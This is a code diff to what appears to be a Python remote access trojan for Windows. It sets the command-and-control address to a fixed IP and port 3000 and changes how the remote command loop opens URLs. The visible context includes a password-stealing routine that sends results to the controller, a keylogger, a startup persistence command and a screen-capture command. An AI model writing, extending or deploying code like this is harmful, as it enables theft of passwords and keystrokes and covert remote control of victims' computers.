@@ -3,7 +3,7 @@ import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
 
-strHost = ""
+strHost = "192.168.1.226"
 # strHost = socket.gethostbyname("")
 intPort = 3000
 
@@ -301,6 +301,7 @@ def chrpass():  # legal purposes only!
     time.sleep(0.2)
     send(str.encode(strResults))
 
+# TODO: Handle powershell text-to-speach
 
 def keylogger(option):
     global strKeyLogs
@@ -364,8 +365,9 @@ while True:
                 sys.exit(0)
             elif strData[:3] == "msg":
                 MessageBox(strData[3:])
-            elif strData[:4] == "site":
-                webbrowser.get().open(strData[4:])
+            # Changed "site" to "http" to support new input
+            elif strData[:4] == "http":
+                webbrowser.get().open(strData)
             elif strData == "startup":
                 startup()
             elif strData == "screen":
